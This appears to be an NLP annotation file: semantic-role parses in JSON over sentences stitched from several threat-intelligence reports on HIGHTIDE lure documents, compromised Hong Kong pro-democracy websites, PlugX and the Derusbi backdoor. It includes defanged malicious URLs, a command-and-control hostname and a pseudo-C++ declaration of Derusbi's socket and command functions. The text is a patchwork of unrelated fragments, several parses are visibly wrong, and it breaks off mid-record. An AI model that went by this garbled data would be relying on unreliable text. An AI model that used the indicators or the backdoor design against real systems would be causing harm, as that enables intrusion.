\u8b70\u7a0b\u6700\u65b0\u4fee\u6b63\u53ca\u6ce8\u610f\u4e8b\u9805.doc                      CVE-2012-0158\nf6fafb7c30b1114befc93f39d0698560 0824.1.doc                           CVE-2012-0158\neaa6e03d9dae356481215e3a9d2914dc \u7c21\u6613\u540d\u518a0\u5168\u570b\u5404\u8b66\u5bdf\u6a5f\u95dc\u4e3b\u5b98\u81f3\u5206\u5c40 CVE-2012-0158\n                                 \u9577.doc\n06da4eb2ab6412c0dc7f295920eb61c4 \u9644 .doc                               CVE-2012-0158\n53baedf3765e27fb465057c48387c9b6 103\u5e74\u7b2c3\u5c46\u901a \u9304.doc                       CVE-2012-0158\n00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob CVE-2012-0158\n                                 and Jason_invitation.doc\n4ab6bf7e6796bb930be2dd0141128d06 \u7522\u8aee\u6703_Y103(2)\u59d4\u54e1\u6703_\u5f9e\u6771\u5354\u65b0\u8208\u570b\u5bb6 CVE-2012-0158\n                                 \u5d1b\u8d77(0825).doc\n</figure>\n<caption>Figure 4: Identified exploit documents for HIGHTIDE</caption>\n\nWhen the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system": {"is": {"V": {"text": "is", "index": 3}}, "opened": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "the file"}, "V": {"text": "opened", "index": 4}}, "drops": {"ARGM-TMP": {"text": "When the file is opened"}, "ARG0": {"text": "it"}, "V": {"text": "drops", "index": 7}, "ARG1": {"text": "HIGHTIDE"}, "ARGM-MNR": {"text": "in the form of an executable file onto the infected system"}}}, "\n\nAt the time of this writing, the People Power website is still serving up malicious code": {"is": {"V": {"text": "is", "index": 11}}, "serving": {"ARGM-TMP": {"text": "At the time of this writing/ still"}, "ARG0": {"text": "the People Power website"}, "V": {"text": "serving", "index": 13}, "ARG1": {"text": "malicious code"}}}, "\n<table>\nURL                    Meta Refresh Page\n\f\nhXXp://985.so/bUYj  N/A (HTTP 404)\nhXXp://985.so/bUYe  hXXp://58.64.178.77:80/SiteLoader\nhXXp://985.so/b6hW  hXXp://58.64.178.77/mPlayer\nhXXp://985.so/bUYf  hXXp://58.64.178.77:80/0wnersh1p\n</table>\nThese pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as\nload Java exploits designed to install malware on the target system": {"load": {"ARG0": {"text": "These pages"}, "V": {"text": "load", "index": 2}, "ARG2": {"text": "scripts that conduct profiling of the system for various software , plugins , and other related information"}}, "conduct": {"ARG0": {"text": "These pages load scripts"}, "R-ARG0": {"text": "that"}, "V": {"text": "conduct", "index": 5}, "ARG1": {"text": "profiling of the system"}}, "exploits": {"ARG1": {"text": "load Java"}, "V": {"text": "exploits", "index": 26}, "ARG2": {"text": "designed to install malware on the target system"}}, "designed": {"ARG1": {"text": "load Java exploits"}, "V": {"text": "designed", "index": 27}, "ARG3": {"text": "to install malware on the target system"}}, "install": {"ARG0": {"text": "load Java exploits"}, "V": {"text": "install", "index": 29}, "ARG1": {"text": "malware"}, "ARG2": {"text": "on the target system"}}}, " Back in\nMay 2011, Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits": {"reported": {"ARGM-TMP": {"text": "Back in May 2011"}, "ARG0": {"text": "Kaspersky Lab"}, "V": {"text": "reported", "index": 7}, "ARG1": {"text": "the website was being leveraged to target users with Flash Exploits"}}, "was": {"V": {"text": "was", "index": 10}}, "being": {"V": {"text": "being", "index": 11}}, "leveraged": {"ARG1": {"text": "the website"}, "V": {"text": "leveraged", "index": 12}, "ARGM-PRP": {"text": "to target users with Flash Exploits"}}, "target": {"ARG0": {"text": "the website"}, "V": {"text": "target", "index": 14}, "ARG1": {"text": "users"}, "ARGM-MNR": {"text": "with Flash Exploits"}}}, " Attackers will often upload new webshells or add simple China Chopper style\nmodifications to legitimate existing files in an attempt to maintain persistence to these systems": {"will": {"ARG0": {"text": "Attackers"}, "V": {"text": "will", "index": 1}, "ARGM-TMP": {"text": "often"}}, "upload": {"ARG0": {"text": "Attackers"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "upload", "index": 3}, "ARG1": {"text": "new webshells"}, "ARGM-PRP": {"text": "in an attempt to maintain persistence to these systems"}}, "add": {"ARG0": {"text": "Attackers"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "add", "index": 7}, "ARG1": {"text": "simple China Chopper style modifications to legitimate existing files"}, "ARGM-PRP": {"text": "in an attempt to maintain persistence to these systems"}}, "legitimate": {"ARG0": {"text": "simple China"}, "V": {"text": "legitimate", "index": 14}, "ARG1": {"text": "existing files"}}, "existing": {"V": {"text": "existing", "index": 15}, "ARG1": {"text": "files"}}, "maintain": {"V": {"text": "maintain", "index": 21}, "ARG1": {"text": "persistence to these systems"}}}, " If successful, the exploits will install either a 32-bit or 64-bit\nversion of the malware": {"will": {"ARGM-ADV": {"text": "If successful"}, "ARG0": {"text": "the exploits"}, "V": {"text": "will", "index": 5}, "ARG1": {"text": "install either a 32-bit or 64-bit version of the malware"}}, "install": {"ARGM-ADV": {"text": "If successful"}, "ARG0": {"text": "the exploits"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "install", "index": 6}, "ARG1": {"text": "either a 32-bit or 64-bit version of the malware"}}}, " This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install\nmalware on their systems": {"meant": {"ARG0": {"text": "This code"}, "V": {"text": "meant", "index": 2}, "ARG1": {"text": "that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems"}}, "were": {"V": {"text": "were", "index": 5}}, "subjected": {"ARG1": {"text": "visitors"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "subjected", "index": 7}, "ARG2": {"text": "to exploit and malicious Java Applets designed to install malware on their systems"}}, "exploit": {"ARG0": {"text": "visitors"}, "V": {"text": "exploit", "index": 9}, "ARGM-ADV": {"text": "designed/ to install malware on their systems"}}, "designed": {"ARG1": {"text": "exploit and malicious Java Applets"}, "V": {"text": "designed", "index": 14}, "ARG3": {"text": "to install malware on their systems"}}, "install": {"ARG0": {"text": "visitors"}, "V": {"text": "install", "index": 16}, "ARG1": {"text": "malware on their systems"}}}, " These\ncompromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the\nimpacted websites": {"were": {"V": {"text": "were", "index": 2}}, "discovered": {"ARG1": {"text": "These compromises"}, "V": {"text": "discovered", "index": 3}, "ARGM-TMP": {"text": "following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites"}}, "following": {"V": {"text": "following", "index": 4}, "ARG1": {"text": "the identification of malicious JavaScript that had been added to legitimate code on the impacted websites"}}, "had": {"V": {"text": "had", "index": 11}}, "been": {"V": {"text": "been", "index": 12}}, "added": {"ARG1": {"text": "malicious JavaScript"}, "R-ARG1": {"text": "that"}, "V": {"text": "added", "index": 13}, "ARG2": {"text": "to legitimate code on the"}}}, " In the case of this post, it appears that at\nleast two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong\nKong": {"appears": {"ARGM-LOC": {"text": "In the case of this post"}, "V": {"text": "appears", "index": 8}, "ARG1": {"text": "that at least two different attackers were involved in compromising and placing malicious code on Pro - Democratic websites in Hong Kong"}}, "were": {"V": {"text": "were", "index": 15}}, "involved": {"ARG1": {"text": "at least two different attackers"}, "V": {"text": "involved", "index": 16}, "ARG2": {"text": "in compromising and placing malicious code on Pro - Democratic websites in Hong Kong"}}, "compromising": {"V": {"text": "compromising", "index": 18}, "ARG2": {"text": "on Pro - Democratic websites"}, "ARGM-LOC": {"text": "in Hong Kong"}}, "placing": {"V": {"text": "placing", "index": 20}, "ARG1": {"text": "malicious code"}, "ARG2": {"text": "on Pro - Democratic websites in Hong Kong"}}}, "\n\nAlliance for True Democracy \u00e2\u20ac\u201c Hong Kong\n\nOver the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy\n(ATD) in Hong Kong (www.atd.hk)": {"has": {"V": {"text": "has", "index": 15}}, "observed": {"R-ARG0": {"text": "Alliance for True Democracy \u00e2\u20ac \u201c Hong Kong Over the last two days"}, "ARG0": {"text": "Volexity"}, "V": {"text": "observed", "index": 16}, "ARG1": {"text": "malicious code being served up from the website of the Alliance for True Democracy ( ATD ) in Hong Kong ( www.atd.hk )"}}, "being": {"V": {"text": "being", "index": 19}}, "served": {"ARG1": {"text": "malicious code"}, "V": {"text": "served", "index": 20}, "ARG2": {"text": "from the website of the Alliance for True Democracy ("}, "ARGM-LOC": {"text": "ATD ) in Hong Kong ( www.atd.hk )"}}}, "\n</section>\n\n<section>\n<heading>Webshell Backdoor</heading>\n\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it": {"examining": {"V": {"text": "examining", "index": 1}, "ARG1": {"text": "the ATD website"}, "ARG0": {"text": "Volexity"}}, "observed": {"ARGM-TMP": {"text": "While examining the ATD website"}, "ARG0": {"text": "Volexity"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "observed", "index": 8}, "ARG1": {"text": "that the site had a password protected backdoor webshell placed on it"}}, "had": {"ARG0": {"text": "the site"}, "V": {"text": "had", "index": 12}, "ARG1": {"text": "a password protected backdoor webshell placed on it"}}, "protected": {"ARG3": {"text": "a password/ backdoor"}, "V": {"text": "protected", "index": 15}}, "placed": {"ARG1": {"text": "a password protected backdoor"}, "V": {"text": "placed", "index": 18}, "ARG2": {"text": "on it"}}}, " In this particular sample an\ninteresting and notable string was observed:\n\n      C:\\wocawocawoca\\piao\\Release\\caca.pdb\n\nAlso of interest is that as observed from the Java Applet, the executable is also digitally signed by a certificate issued to \u00e2\n\u20ac\u0153WindySoft.\u00e2\u20ac\u200b\n\n<figure></figure>\n\n\nUpon execution the malware sample immediately does a DNS resolution for the following hostname:\n\n    jduhf873jdu7.blog.163.com\n\nThe PlugX sample connects to the blog and parses the page for a command for where to connect to next": {"was": {"V": {"text": "was", "index": 9}}, "observed": {"ARGM-LOC": {"text": "In this particular sample"}, "ARG1": {"text": "an interesting and notable string"}, "V": {"text": "observed", "index": 10}}, "is": {"ARG1": {"text": "C:\\wocawocawoca\\piao\\Release\\caca.pdb Also of interest"}, "V": {"text": "is", "index": 16}, "ARG2": {"text": "that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to \u00e2 \u20ac \u0153WindySoft.\u00e2\u20ac\u200b Upon execution the malware sample immediately does a DNS resolution for the following hostname : jduhf873jdu7.blog.163.com The PlugX sample connects to the blog and parses the page for a command for where to connect to next"}}, "observed_2": {"V": {"text": "observed", "index": 19}, "ARG0": {"text": "from the Java Applet"}}, "is_2": {"V": {"text": "is", "index": 27}}, "signed": {"ARGM-ADV": {"text": "as observed from the Java Applet/ also"}, "ARG1": {"text": "the executable"}, "V": {"text": "signed", "index": 30}, "ARG0": {"text": "by a certificate issued to \u00e2 \u20ac \u0153WindySoft.\u00e2\u20ac\u200b Upon execution the malware sample"}}, "issued": {"ARG1": {"text": "a certificate"}, "V": {"text": "issued", "index": 34}, "ARGM-PRP": {"text": "to \u00e2 \u20ac \u0153WindySoft.\u00e2\u20ac\u200b Upon execution the malware sample"}}, "does": {"ARG0": {"text": "sample"}, "ARGM-TMP": {"text": "immediately"}, "V": {"text": "does", "index": 45}, "ARG1": {"text": "a DNS resolution for the following hostname : jduhf873jdu7.blog.163.com The PlugX"}}, "following": {"V": {"text": "following", "index": 51}}, "parses": {"V": {"text": "parses", "index": 63}, "ARG1": {"text": "the page"}, "ARGM-PRP": {"text": "for a command for where to connect to next"}}, "connect": {"ARGM-LOC": {"text": "where"}, "V": {"text": "connect", "index": 72}, "ARG1": {"text": "to next"}}}, " Like the ATD website, at the time of this writing the DPHK websites are also serving up malicious\ncode, so please browse with caution": {"writing": {"V": {"text": "writing", "index": 10}}, "are": {"V": {"text": "are", "index": 14}}, "serving": {"ARGM-ADV": {"text": "Like the ATD website/ also"}, "ARGM-TMP": {"text": "at the time of this writing"}, "ARG0": {"text": "the DPHK websites"}, "V": {"text": "serving", "index": 16}, "ARG1": {"text": "malicious code"}}, "browse": {"ARGM-DIS": {"text": "please"}, "V": {"text": "browse", "index": 23}, "ARGM-MNR": {"text": "with caution"}}}, "\n\nIt is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise": {"is": {"V": {"text": "is", "index": 1}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "worth"}, "ARG1": {"text": "noting that this is not the first time that the DPHK website has been used in a strategic web compromise"}}, "noting": {"V": {"text": "noting", "index": 4}, "ARG1": {"text": "that this is not the first time that the DPHK website has been used in a strategic web compromise"}}, "is_2": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 7}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "the first time that the DPHK website has been used in a strategic web compromise"}}, "has": {"V": {"text": "has", "index": 16}}, "been": {"V": {"text": "been", "index": 17}}, "used": {"ARGM-TMP": {"text": "the first time"}, "R-ARGM-TMP": {"text": "that"}, "ARG1": {"text": "the DPHK website"}, "V": {"text": "used", "index": 18}, "ARG2": {"text": "in a strategic web compromise"}}}, "\n\nThis system hosted a JavaScript file, which in turned loads a malicious Java Applet": {"hosted": {"ARG0": {"text": "This system"}, "V": {"text": "hosted", "index": 2}, "ARG1": {"text": "a JavaScript file , which in turned loads a malicious Java Applet"}}, "turned": {"ARG0": {"text": "a JavaScript file"}, "R-ARG0": {"text": "which"}, "V": {"text": "turned", "index": 9}, "ARG1": {"text": "a malicious Java Applet"}}}, "\n</section>\n\n<section>\n<heading>People Power \u00e2\u20ac\u201c Hong Kong</heading>\n\nDuring the course of investigating activity related to the ATD and DPHK websites, Volexity also observed that the website of the\npolitical coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk) had been compromised as\nwell": {"investigating": {"V": {"text": "investigating", "index": 4}, "ARG1": {"text": "activity related to the ATD and DPHK websites"}}, "related": {"ARG1": {"text": "investigating activity"}, "V": {"text": "related", "index": 6}, "ARG2": {"text": "to the ATD and DPHK websites"}}, "observed": {"ARGM-TMP": {"text": "During the course of investigating activity related to the ATD and DPHK websites"}, "ARG0": {"text": "Volexity"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 16}, "ARG1": {"text": "that the website of the political coalition and pan - democratic organization People Power in Hong Kong ( www.peoplepower.hk ) had been compromised as well"}}, "had": {"V": {"text": "had", "index": 37}}, "been": {"V": {"text": "been", "index": 38}}, "compromised": {"ARG1": {"text": "the website of the political coalition and pan - democratic organization People Power in Hong Kong ( www.peoplepower.hk )"}, "V": {"text": "compromised", "index": 39}, "ARGM-ADV": {"text": "as well"}}}, "\n\nCommLoop routes packets to the appropriate command handler object by locating the\ndwPacketIdentifierCode within each of the registered command handlers that matches the\nincoming packets dwPktType": {"locating": {"V": {"text": "locating", "index": 10}, "ARG1": {"text": "the dwPacketIdentifierCode"}}, "matches": {"ARG0": {"text": "the registered command handlers"}, "R-ARG0": {"text": "that"}, "V": {"text": "matches", "index": 21}, "ARG1": {"text": "the incoming packets dwPktType"}}}, " The device driver inspects incoming network traffic from any\nclient connecting to the victim machine, determines if an appropriate handshake packet occurs\nat the beginning of a new TCP session, and then makes the decision to reroute the network\ntraffic to the Derusbi malware or let the traffic continue unaltered to its original service": {"connecting": {"ARG1": {"text": "any client"}, "V": {"text": "connecting", "index": 10}, "ARG2": {"text": "to the victim machine"}}, "determines": {"ARG0": {"text": "The device driver"}, "V": {"text": "determines", "index": 16}, "ARG1": {"text": "if an appropriate handshake packet occurs at the beginning of a new TCP session"}}, "occurs": {"ARG1": {"text": "an appropriate handshake packet"}, "V": {"text": "occurs", "index": 22}, "ARGM-TMP": {"text": "at the beginning of a new TCP session"}}, "makes": {"ARG0": {"text": "The device driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "makes", "index": 34}, "ARG1": {"text": "the decision to reroute the network traffic to the Derusbi malware"}}, "reroute": {"ARG0": {"text": "The device driver"}, "V": {"text": "reroute", "index": 38}, "ARG1": {"text": "the network traffic"}, "ARG2": {"text": "to the Derusbi malware"}}, "let": {"ARG0": {"text": "The device driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "let", "index": 47}, "ARG1": {"text": "the traffic continue unaltered to its original service"}}, "continue": {"ARG0": {"text": "the traffic"}, "V": {"text": "continue", "index": 50}, "ARG1": {"text": "unaltered to its original service"}}}, "\n\f\n<figure>>\nclass BD_SOCK\n{\n  // members\n  ~BD_SOCK();           // destructor\n  BD_SOCK* Copy(bool fCopySocket); // duplicate object\n\n     // member variables\n     DWORD dwLastError;\n     char szHostName[256];\n     DWORD dwListeningPortNumber;\n     SOCKET sktRemoteEndpoint;\n     SOCKET hListeningSocket;\n     };\n\nclass PCC_SOCK: BD_SOCK\n{\n  ~PCC_SOCK(); // destructor\n\n  // virtual members\n  PCC_SOCK * Copy(bool fCopyListeningSocket);\n  SOCKET ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake(int\na2, int a3, int a4, int a5, char *pszHostname, int wHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndHandshake(char *pszHostname, int\nwHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndPerformPOSTLogin(char *pszHostname,\nint wHostPort);\n  SOCKET WaitForClient();\n  int SendEncodedData(int dwPktType, void *payload, size_t dwPayloadSize);\n  int RecvEncodeData(DWORD *pdwPktType, char **pvPayload, DWORD\n*pdwPayloadSize);\n  void freeMemory(void *pMemory);\n\n     // member functions\n     int SendVictimInfo();\n     int WaitForReadEvent(int dwTimeout);\n     int SOCKSConnectWithRandomLocalPort(int dwEndPointIP, u_short hostshort);\n     int BindToRandomPort(SOCKET s);\n     int SendBuffer(SOCKET s, char *buf, int len);\n     SOCKET AcceptIncomingConnection();\n     SOCKET ConnectToRemoteEndpointByName(char *szHostName, int hostshort);\n     SOCKET ConnectToRemoteEndpoint(int dwIP, u_short wPort);\n     int ReadFromRemoteEndpoint(char *buf, int len);\n     SOCKET NewSocket();\n     int BindSocket(SOCKET s, int dwLowPort, int dwHighPort);\n     int SendAuthenicationResponse(void *pvResponse);\n     int SendHTTP200ResponseIfViaHeaderFound (char *Str);\n\n // member variables\n char compressionBuffer[65536];\n\n};\n</figure>\n<caption>Figure 1: PCC_SOCK Declaration in Pseudo-C++</caption>\n\nWith a new PCC_SOCK object allocates, DerusbiThread::DerusbiThread selects a port\nbetween 40,000 and 45,000 to use as a listening port": {"selects": {"ARGM-ADV": {"text": "With a new PCC_SOCK object allocates"}, "ARG0": {"text": "DerusbiThread::DerusbiThread"}, "V": {"text": "selects", "index": 8}, "ARG1": {"text": "a port between 40,000 and 45,000"}, "ARGM-PRP": {"text": "to use as a listening port"}}, "use": {"ARG0": {"text": "DerusbiThread::DerusbiThread"}, "ARG1": {"text": "a port between 40,000 and 45,000"}, "V": {"text": "use", "index": 16}, "ARG2": {"text": "as a listening port"}}}, "\nThe mainLoop attempts to get the privileges for SeDebugPrivilege,\nSeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege in order to\nperform the necessary operations to load the driver portion of the server variant": {"attempts": {"ARG0": {"text": "The mainLoop"}, "V": {"text": "attempts", "index": 2}, "ARG1": {"text": "to get the privileges for SeDebugPrivilege , SeLoadDriverPrivilege , SeShutdownPrivilege , and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant"}}, "get": {"ARG0": {"text": "The mainLoop"}, "V": {"text": "get", "index": 4}, "ARG1": {"text": "the privileges"}, "ARG3": {"text": "for SeDebugPrivilege"}}, "SeTcbPrivilege": {"ARG0": {"text": "The mainLoop/ SeLoadDriverPrivilege"}, "V": {"text": "SeTcbPrivilege", "index": 15}, "ARGM-PRP": {"text": "in order to perform the necessary operations to load the driver portion of the server variant"}}, "perform": {"ARG0": {"text": "The mainLoop"}, "V": {"text": "perform", "index": 19}, "ARG1": {"text": "the necessary operations"}, "ARGM-PRP": {"text": "to load the driver portion of the server variant"}}, "load": {"V": {"text": "load", "index": 24}, "ARG2": {"text": "the driver portion"}, "ARG1": {"text": "of the server variant"}}}, "\nDerusbiThread::DerusbiThread binds to the specified port and opens the port as a\nlistener": {"binds": {"ARGM-DIS": {"text": "DerusbiThread::DerusbiThread"}, "V": {"text": "binds", "index": 1}, "ARG2": {"text": "to the specified port"}}, "specified": {"V": {"text": "specified", "index": 4}, "ARG1": {"text": "port"}}, "opens": {"ARG0": {"text": "DerusbiThread::DerusbiThread"}, "V": {"text": "opens", "index": 7}, "ARG1": {"text": "the port"}, "ARG3": {"text": "as a listener"}}}, "\n\nWhen loaded into memory via a LoadLibrary or equivalent function call, the server variant will\ndetermine the name of the host binary (presumably svchost.exe) as well as its own DLL\u2019s\nname": {"loaded": {"ARGM-TMP": {"text": "When"}, "V": {"text": "loaded", "index": 1}, "ARG1": {"text": "into memory"}, "ARGM-MNR": {"text": "via a LoadLibrary or equivalent function call"}}, "will": {"V": {"text": "will", "index": 15}}, "determine": {"ARGM-TMP": {"text": "When loaded into memory via a LoadLibrary or equivalent function call"}, "ARG0": {"text": "the server variant"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "determine", "index": 16}, "ARG1": {"text": "the name of the host binary ( presumably svchost.exe ) as well as its own DLL \u2019s name"}}}, " What makes the server variant interesting is the device driver that the variant installs": {"makes": {"ARG0": {"text": "What"}, "V": {"text": "makes", "index": 1}, "ARG1": {"text": "the server variant interesting"}}, "is": {"ARG1": {"text": "What makes the server variant interesting"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "the device driver that the variant installs"}}}, " The device driver does not capture or store any network traffic\noutside of the initial handshake inspection.\t\n</section> \u00a0\t\n \u00a0\n\f\n<section>\n<heading>Communication and Command Dispatch</heading>\nThe Derusbi server variant will select an available, random port between the range of 40,000\nand 45,000 on the victim\u2019s machine upon which to listen": {"does": {"V": {"text": "does", "index": 3}}, "capture": {"ARG0": {"text": "The device driver"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "capture", "index": 5}, "ARG1": {"text": "any network traffic"}, "ARGM-LOC": {"text": "outside of the initial handshake inspection"}}, "store": {"ARG0": {"text": "The device driver"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "store", "index": 7}, "ARG1": {"text": "any network traffic"}, "ARGM-LOC": {"text": "outside of the initial handshake inspection"}}, "will": {"ARG0": {"text": "The Derusbi server variant"}, "V": {"text": "will", "index": 22}, "ARG1": {"text": "select an available , random port between the range of 40,000 and 45,000 on the victim \u2019s machine upon which"}}, "select": {"ARG0": {"text": "The Derusbi server variant"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "select", "index": 23}, "ARG1": {"text": "an available , random port between the range of 40,000 and 45,000 on the victim \u2019s machine upon which to listen"}}, "listen": {"ARGM-LOC": {"text": "the"}, "R-ARGM-TMP": {"text": "upon which"}, "V": {"text": "listen", "index": 44}}}, " This report will focus on the server-client variant (or simply,\nthe \u201cserver variant\u201d) of Derusbi, which acts as a server on a victim\u2019s machine and waits for\ncommands from a controlling client": {"will": {"ARG0": {"text": "This report"}, "V": {"text": "will", "index": 2}, "ARG1": {"text": "focus on the server - client variant ( or simply"}}, "focus": {"ARG0": {"text": "This report"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "focus", "index": 3}, "ARG2": {"text": "on the server - client variant ( or simply , the \u201c server variant \u201d ) of Derusbi , which acts as a server on a victim \u2019s machine and waits for commands from a controlling client"}}, "acts": {"ARG0": {"text": "Derusbi"}, "R-ARG0": {"text": "which"}, "V": {"text": "acts", "index": 24}, "ARG1": {"text": "as a server/ on a victim \u2019s machine"}}, "controlling": {"V": {"text": "controlling", "index": 39}, "ARG0": {"text": "client"}}}, "\nThe server variant utilizes a device driver in order to hook into the Windows firewall by either\nusing largely undocumented Windows Firewall hooking techniques found in Windows XP and\nolder or by using the documented Windows Filtering Platform found in Windows Vista and later": {"utilizes": {"ARG0": {"text": "The server variant"}, "V": {"text": "utilizes", "index": 3}, "ARG1": {"text": "a device driver"}, "ARGM-PRP": {"text": "in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later"}}, "hook": {"V": {"text": "hook", "index": 10}, "ARG2": {"text": "into the Windows firewall"}, "ARGM-MNR": {"text": "by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later"}}, "found": {"V": {"text": "found", "index": 24}, "ARGM-LOC": {"text": "in Windows XP and older"}}, "using_2": {"V": {"text": "using", "index": 32}, "ARG1": {"text": "the documented Windows Filtering Platform found in Windows Vista and later"}}, "documented": {"V": {"text": "documented", "index": 34}, "ARG1": {"text": "Windows Filtering Platform"}}, "found_2": {"ARG1": {"text": "using the documented Windows Filtering Platform"}, "V": {"text": "found", "index": 38}, "ARGM-LOC": {"text": "in Windows Vista"}, "ARGM-TMP": {"text": "and later"}}}, "\nThe server variant then attempts to determine if it has suitable access rights within the system in\norder to operation": {"attempts": {"ARG0": {"text": "The server variant"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "attempts", "index": 4}, "ARG1": {"text": "to determine if it has suitable access rights within the system in order to operation"}}, "determine": {"ARG0": {"text": "The server variant"}, "V": {"text": "determine", "index": 6}, "ARG1": {"text": "if it has suitable access rights within the system in order to operation"}}, "has": {"ARG0": {"text": "it"}, "V": {"text": "has", "index": 9}, "ARG1": {"text": "suitable access rights within the system"}, "ARGM-PRP": {"text": "in order to operation"}}}, "\nThe driver, after hooking the firewall using either of the two mentioned interfaces, will inspect\nincoming network packets": {"hooking": {"ARG0": {"text": "The driver"}, "V": {"text": "hooking", "index": 4}, "ARG1": {"text": "the firewall"}, "ARGM-MNR": {"text": "using either of the two mentioned interfaces"}}, "using": {"ARG0": {"text": "The driver"}, "V": {"text": "using", "index": 7}, "ARG1": {"text": "either of the two mentioned interfaces"}}, "mentioned": {"V": {"text": "mentioned", "index": 12}, "ARG1": {"text": "interfaces"}}, "will": {"ARGM-TMP": {"text": "after hooking the firewall using either of the two mentioned interfaces"}, "V": {"text": "will", "index": 15}, "ARG1": {"text": "inspect incoming network packets"}}, "inspect": {"ARG0": {"text": "The driver"}, "ARGM-TMP": {"text": "after hooking the firewall using either of the two mentioned interfaces"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "inspect", "index": 16}, "ARG1": {"text": "incoming network packets"}}}, " This allows an attacker to hide their\ncommunication within a cluster of network sessions originating from a single IP such as would\nbe the case for a client performing multiple HTTP requests against a web server": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server"}}, "hide": {"ARG0": {"text": "an attacker"}, "V": {"text": "hide", "index": 5}, "ARG1": {"text": "their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server"}}, "originating": {"ARG1": {"text": "a cluster of network sessions"}, "V": {"text": "originating", "index": 14}, "ARG2": {"text": "from a single IP such as would be the case for a client performing multiple HTTP requests against a web server"}}, "would": {"V": {"text": "would", "index": 21}, "ARG2": {"text": "be the case for a client performing multiple HTTP requests against a web server"}}, "be": {"ARG1": {"text": "a single IP"}, "R-ARG1": {"text": "such"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "be", "index": 22}, "ARG2": {"text": "the case for a client performing multiple HTTP requests against a web server"}}, "performing": {"ARG0": {"text": "a client"}, "V": {"text": "performing", "index": 28}, "ARG1": {"text": "multiple HTTP requests against a web server"}}}, " The binary then spawns a new thread that contains the main server variant code in order\nto allow the DllEntryPoint routine to return to the calling function": {"spawns": {"ARG0": {"text": "The binary"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "spawns", "index": 3}, "ARG1": {"text": "a new thread that contains the main server variant code"}, "ARGM-PRP": {"text": "in order to allow the DllEntryPoint routine to return to the calling function"}}, "contains": {"ARG0": {"text": "a new thread"}, "R-ARG0": {"text": "that"}, "V": {"text": "contains", "index": 8}, "ARG1": {"text": "the main server variant code"}, "ARGM-PRP": {"text": "in order to allow the DllEntryPoint routine to return to the calling function"}}, "allow": {"V": {"text": "allow", "index": 17}, "ARG1": {"text": "the DllEntryPoint routine to return to the calling function"}}, "return": {"ARG1": {"text": "the DllEntryPoint routine"}, "V": {"text": "return", "index": 22}, "ARG4": {"text": "to the calling function"}}, "calling": {"V": {"text": "calling", "index": 25}, "ARG0": {"text": "function"}}}, " The\nDllRegisterServer function, among other tasks, will attempt to install the server variant as a\nserver on the victim\u2019s machine": {"will": {"ARGM-ADV": {"text": "among other tasks"}, "V": {"text": "will", "index": 8}, "ARG1": {"text": "attempt to install the server variant as a server on the victim \u2019s machine"}}, "attempt": {"ARG0": {"text": "The DllRegisterServer function"}, "ARGM-ADV": {"text": "among other tasks"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 9}, "ARG1": {"text": "to install the server variant as a server on the victim \u2019s machine"}}, "install": {"ARG0": {"text": "The DllRegisterServer function"}, "V": {"text": "install", "index": 11}, "ARG1": {"text": "the server variant"}, "ARG2": {"text": "as a server on the victim \u2019s machine"}}}, "\n\n\n<figure></figure>\n\n         <caption>Figure 4: Possible Presentations of the Payload Section of a Derusbi Server Variant's Datagram</caption>\n\nAfter sending the server information via the VictimInfoPacket, the server variant spins off a\nCommLoop thread for the connection and returns to waiting for new connections from clients to\nappear": {"sending": {"V": {"text": "sending", "index": 1}, "ARG1": {"text": "the server information"}, "ARGM-MNR": {"text": "via the VictimInfoPacket"}}, "spins": {"ARGM-TMP": {"text": "After sending the server information via the VictimInfoPacket"}, "ARG0": {"text": "the server variant"}, 